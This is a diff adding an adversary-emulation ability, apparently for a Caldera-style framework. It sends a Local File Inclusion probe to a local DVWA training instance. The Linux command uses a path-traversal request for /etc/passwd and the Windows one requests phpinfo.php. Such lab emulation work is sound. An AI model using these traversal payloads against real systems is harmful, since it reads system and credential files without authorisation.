@@ -1,0 +1,28 @@
+- id: a1b2c3d4-dvwa-0004-flfi-000000000004
+  name: DVWA - Local File Inclusion Probe (Low)
+  description: Traverses local path via DVWA File Inclusion endpoint
+  tactic: discovery
+  technique_id: T1083
+  technique_name: File and Directory Discovery
+  repeatable: false
+  executors:
+    - name: sh
+      platform: linux
+      command: |
+        DVWA_URL="${DVWA_URL:-http://127.0.0.1:80/dvwa}"
+        COOKIE_FILE="/tmp/dvwa_cookie.txt"
+        curl -s -b "$COOKIE_FILE" -b "security=low" \
+          "$DVWA_URL/vulnerabilities/fi/?page=../../../../etc/passwd" > /dev/null || true
+        echo "[+] Sent LFI probe query"
+        exit 0
+      timeout: 30
+    - name: psh
+      platform: windows
+      command: |
+        $DvwaUrl = if ($env:DVWA_URL) { $env:DVWA_URL } else { "http://127.0.0.1:80/dvwa" }
+        $CookieFile = "$env:TEMP\dvwa_cookie.txt"
+        curl.exe -s -b "$CookieFile" -b "security=low" `
+          "$DvwaUrl/vulnerabilities/fi/?page=phpinfo.php" | Out-Null
+        Write-Output "[+] Sent LFI probe query"
+        exit 0
+      timeout: 30
